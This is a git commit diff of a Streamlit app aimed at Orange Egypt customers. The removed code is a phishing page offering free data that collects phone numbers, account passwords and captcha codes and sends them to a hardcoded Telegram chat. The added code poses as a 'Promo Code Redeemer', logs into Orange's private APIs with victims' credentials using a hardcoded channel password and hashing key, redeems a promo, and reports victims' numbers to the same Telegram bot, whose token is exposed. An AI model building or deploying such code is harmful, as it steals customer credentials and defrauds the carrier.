251a7ac775b83c2148ebd9e524da9bfb7ce3c58e
afyffshf22 <157223247+afyffshf22@users.noreply.github.com>
2024-05-14 00:05:26 +0300

    Update app.py

--- app.py
+++ app.py
@@ -1,113 +1,74 @@
 import streamlit as st
+import requests
+import hashlib
 import telebot
 
-# Replace 'YOUR_TOKEN' with your Telegram Bot token
-TOKEN = '7060312406:AAGqNhOh6s4RVufoV4Qp1eq8D0DNNDfDiZs'
-
+# Telegram bot setup
+TOKEN = "7060312406:AAGqNhOh6s4RVufoV4Qp1eq8D0DNNDfDiZs"
+CHAT_ID = 5939899289
 bot = telebot.TeleBot(TOKEN)
 
-@bot.message_handler(commands=['start'])
-def start_message(message):
-    bot.reply_to(message, 'مرحبًا! قم بإدخال رقم تليفون اورانج وباسورد تطبيق my orange.')
+# Streamlit app
+st.title("Orange Promo Code Redeemer")
+num = st.text_input("Enter your number:")
+pas = st.text_input("Enter your password:", type="password")
+submit_button = st.button("Redeem Promo Code")
 
-@bot.message_handler(func=lambda message: True)
-def echo_message(message):
-    bot.send_message(message.chat.id, message.text)
+if submit_button:
+    st.write("Please wait...")
 
-def main():
-    st.title('500MB | orange')
+    url = 'https://services.orange.eg/SignIn.svc/SignInUser'
+    header ={
+    "net-msg-id": "61f91ede006159d16840827295301013",
+    "x-microservice-name": "APMS",
+    "Content-Type": "application/json; charset=UTF-8",
+    "Content-Length": "166",
+    "Host": "services.orange.eg",
+    "Connection": "Keep-Alive",
+    "Accept-Encoding": "gzip",
+    "User-Agent": "okhttp/3.14.9",
+    }
+    data = '{"appVersion":"7.2.0","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}' % (num,pas)
+    r = requests.post(url, headers=header, data=data).json()
 
-    st.markdown(
-        """
-        <style>
-            .box {
-              width: 275px;
-              padding: 55px 56px;
-              poosition: absolute;
-              background-color: black;
-              height: 375px;
-              border-radius: 20px;
-            }
+    userid = r["SignInUserResult"]["UserData"]["UserID"]
+    st.write("Wait..🤌🔥")
 
-            body {
-              margin: 0;
-              padding: 0;
-              font-family: sans-serif;
-              justify-content: center;
-              align-items: center;
-              display: flex;
-              background-position: center center;
-              background-attachment: fixed;
-              background-repeat: no-repeat;
-              background-size: 100% 100%;
-              background-image: url(https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/Orange_logo.svg/1200px-Orange_logo.svg.png);
-            }
+    urlo = "https://services.orange.eg/GetToken.svc/GenerateToken"
+    hdo = {"Content-type":"application/json", 
+      "Content-Length":"78", 
+      "Host":"services.orange.eg",
+       "Connection":"Keep-Alive",
+        "User-Agent":"okhttp/3.12.1"}
+    datao = '{"appVersion":"2.9.8","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}' %(num,pas)
+    ctv = requests.post(urlo, headers=hdo, data=datao).json()["GenerateTokenResult"]["Token"]
+    key = ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
+    htv = (str(hashlib.sha256((ctv+key).encode('utf-8')).hexdigest()).upper())
+    url2 = "https://services.orange.eg/APIs/Promotions/api/CAF/Redeem"
+    data2 = '{"Language":"ar","OSVersion":"Android7.0","PromoCode":"رمضان كريم","dial":"%s","password":"%s","Channelname":"MobinilAndMe","ChannelPassword":"ig3yh*mk5l42@oj7QAR8yF"}' %(num,pas)
+    header2 = {
+    "_ctv": ctv,
+    "_htv": htv,
+    "UserId": userid,
+    "Content-Type": "application/json; charset=UTF-8",
+    "Content-Length": "142",
+    "Host": "services.orange.eg",
+    "Connection": "Keep-Alive",
+    "User-Agent": "okhttp/3.14.9",
+    }
+    da = data2.encode('utf-8')
+    response = requests.post(url2, headers=header2, data=da).json()
 
-            input {
-              background-color: black;
-              display: block;
-              margin: 20px auto;
-              text-align: center;
-              padding: 14px 11px;
-              width: 274px;
-              color: white;
-              border-radius: 24px;
-              font-weight: bolder;
-              border: 2px solid lightblue;
-            }
-
-            .box input:focus {
-              border: 2.5px solid yellow;
-            }
-
-            .box .btn {
-              display: block;
-              margin: 20px auto;
-              text-align: center;
-              color: white;
-              font-weight: bolder;
-              border-radius: 10px;
-              padding: 5px 30px;
-              border: 2px solid yellow;
-              background-color: black;
-              font-size: 16px
-            }
-
-            #loading-indicator {
-              display: none;
-            }
-
-            #loading-indicator:before {
-              content: "";
-              display: inline-block;
-              width: 35px;
-              height: 35px;
-              border: 6px solid yellow;
-              border-top-color: red;
-              border-bottom-color: darkred;
-              border-radius: 50%;
-              animation: spin 0.67s linear infinite;
-            }
-
-            @keyframes spin {
-              to {
-                transform: rotate(360deg);
-              }
-            }
-        </style>
-        """,
-        unsafe_allow_html=True
-    )
-
-    number = st.text_input("رقم تليفون اورانج", type="default")
-    password = st.text_input("باسورد تطبيق my orange", type="password")
-
-    captcha_response = st.text_input("كود الكباتشا")
-
-    if st.button("add 500mb"):
-        bot_message = f"رقم التليفون: {number}\nباسورد تطبيق my orange: {password}\nكود الكباتشا: {captcha_response}"
-        bot.send_message('5939899289', bot_message)
-        st.write("تم إرسال المعلومات بنجاح ")
-
-if __name__ == '__main__':
-    main()
+    if 'ErrorDescription' in response:
+        if response['ErrorDescription'] == 'Success':
+            st.success("تم إضافة 524 ميجا بنجاح")
+            bot.send_message(CHAT_ID, f"تم إضافة 524 ميجا بنجاح إلى الرقم {num}")
+        elif response['ErrorDescription'] == 'User is redeemed before':
+            st.error("العرض غير متاح لك حاليا")
+            bot.send_message(CHAT_ID, f"العرض غير متاح لك حاليا")
+        else:
+            st.error(f"pas")
+            bot.send_message(CHAT_ID, f"num")
+    else:
+        st.error(f"pas")
+        bot.send_message(CHAT_ID, f"num")
